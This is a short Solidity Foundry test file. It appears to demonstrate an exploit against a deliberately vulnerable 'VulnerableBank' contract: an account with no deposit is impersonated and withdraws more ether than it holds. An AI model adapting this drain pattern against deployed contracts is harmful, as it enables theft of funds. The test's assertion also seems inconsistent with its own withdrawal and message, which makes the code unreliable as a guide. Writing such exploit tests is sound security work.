// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import "./basetest.sol";
import "../src/VulnerableBank.sol";

contract VulnerableBankTest is BaseTestWithBalanceLog {
    VulnerableBank target;

    function setUp() public override {
        target = new VulnerableBank();
        target.deposit{value: 1 ether}(); // Deposit initial ETH to the contract
    }

    function testExploit() public {
        address attacker = vm.addr(9); // Create an attacker account
        vm.prank(attacker); // Impersonate the attacker for subsequent transactions

        target.withdraw(2 ether);
        assertEq(target.balances(attacker), 1 ether, "Attacker should have withdrawn all funds");
    }
}